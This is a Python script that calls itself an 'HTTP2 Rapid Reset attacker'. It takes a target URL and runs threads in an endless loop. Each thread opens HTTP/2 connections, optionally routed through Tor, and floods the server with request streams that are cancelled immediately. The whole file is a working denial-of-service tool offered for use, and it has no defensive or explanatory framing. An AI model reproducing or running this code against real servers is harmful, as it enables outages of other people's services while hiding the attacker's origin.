import argparse
from urllib.parse import urlparse
import socket
import h2.connection
import h2.events
import h2.config
import h2.errors
import ssl
import threading
import time
import socks

class H2rr(object):
    active_threads = 0

    def __init__(self, url: str, threads: int, tor: bool = False):
        self.url = url
        self.threads = threads
        self.tor = tor

        parsed_url = urlparse(url)
        self.parsed_url = parsed_url

        self.host_ip = socket.gethostbyname(parsed_url.hostname)
        port = parsed_url.port
        path = parsed_url.path

        if not port:
            if parsed_url.scheme == "https":
                port = 443
            else:
                port = 80

        if not path:
            path = "/"

        if parsed_url.query:
            path += f"?{parsed_url.query}"

        self.port = port
        self.path = path

    def create_instance(self):
        try:
            self.active_threads += 1

            if self.tor:
                sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                sock.set_proxy(proxy_type=socks.SOCKS5, addr="127.0.0.1", port=9050)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            sock.settimeout(10)
            sock.connect((self.host_ip, self.port))

            #if self.parsed_url.scheme == "https":
            ctx = ssl.create_default_context()
            ctx.set_alpn_protocols(["h2"])
            sock = ctx.wrap_socket(sock=sock, server_hostname=self.parsed_url.hostname)

            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())

            for _ in range(10):
                for _ in range(54):
                    stream_id = conn.get_next_available_stream_id()

                    conn.send_headers(
                        stream_id,
                        [
                            (":method", "GET"),
                            (":authority", self.parsed_url.hostname),
                            (":path", self.path),
                            (":scheme", self.parsed_url.scheme)
                        ],
                        end_stream=True
                    )
                    conn.reset_stream(stream_id=stream_id, error_code=h2.errors.ErrorCodes.CANCEL)

                    sock.send(conn.data_to_send())

                    print("sent")

        except Exception:
            return
        
        finally:
            self.active_threads -= 1

def main():
    parser = argparse.ArgumentParser(description="Python-written HTTP2 Rapid Reset attacker.")
    parser.add_argument("URL", type=str, help="Target URL.")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Attack threads to run.")
    parser.add_argument("--tor", action="store_true", default=False, help="Use Tor proxies.")

    args = parser.parse_args()

    h2rr = H2rr(url=args.URL, threads=args.threads, tor=args.tor)

    try:
        while True:
            if h2rr.active_threads >= h2rr.threads:
                time.sleep(0.05)
                continue

            threading.Thread(target=h2rr.create_instance, daemon=True).start()
            time.sleep(0.2)

    except KeyboardInterrupt:
        exit()

if __name__ == "__main__":
    main()
